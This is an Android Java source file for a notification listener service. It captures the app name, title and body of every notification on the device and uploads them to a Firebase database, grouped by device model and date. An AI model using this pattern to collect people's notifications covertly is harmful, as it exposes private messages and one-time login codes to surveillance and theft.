package com.notificationlistemer.tomal;

import android.app.Notification;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;

import java.io.IOException;
import java.lang.reflect.Type;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;

public class NotificationListener extends NotificationListenerService {

    ArrayList<String> arrayList = new ArrayList<>();

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        super.onNotificationPosted(sbn);
        String packageName = sbn.getPackageName();

        // Get the extras bundle from the notification
        Bundle extras = sbn.getNotification().extras;
        // Get the notification title
        String title = extras.getString(Notification.EXTRA_TITLE);

        if (sbn.getNotification().priority == Notification.PRIORITY_HIGH | sbn.getNotification().priority == Notification.PRIORITY_DEFAULT | sbn.getNotification().priority == Notification.PRIORITY_LOW | sbn.getNotification().priority == Notification.PRIORITY_MAX | sbn.getNotification().priority == Notification.PRIORITY_MIN){
            String msg = sbn.getNotification().extras.getString("android.text");
            String title1 = sbn.getNotification().extras.getString("android.title");
            System.out.println( msg + " , " + title1 );
        }

        // Get the notification body (content text)
        String body = extras.getString(Notification.EXTRA_TEXT);
        String notificationData = "App : "+ packageName + " Title : " + title + " Body : "+ body;

        System.out.println( notificationData);

        arrayList.add(notificationData);

        String deviceName = Build.MODEL;
        /*System.out.println("My array list : "+ arrayList);
        Gson json = new Gson();
        String data = json.toJson(arrayList);
        SharedPreferences sharedPreferences = getSharedPreferences("MyPreferences", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString("myArrayListKey", data);
        editor.apply();

        //
        String returnJson = sharedPreferences.getString("myArrayListKey", null);


        Gson gson = new Gson();
        Type type = new TypeToken<ArrayList<String>>() {}.getType();
        ArrayList<String> savedArrayList = gson.fromJson(returnJson, type);
        System.out.println(savedArrayList);*/
        setValue(arrayList, deviceName);

    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
    }

    public void setValue(ArrayList<String> value, String name) {
        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference("Data");
        String key = databaseReference.push().getKey();
        Date date = new Date();
        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault());
        String date_send = sdf.format(date);
        databaseReference.child(name).child(date_send).child(key).setValue(value)
                .addOnSuccessListener(new OnSuccessListener<Void>() {
                    @Override
                    public void onSuccess(Void unused) {
                        arrayList.clear();
                    }
                });
    }
}
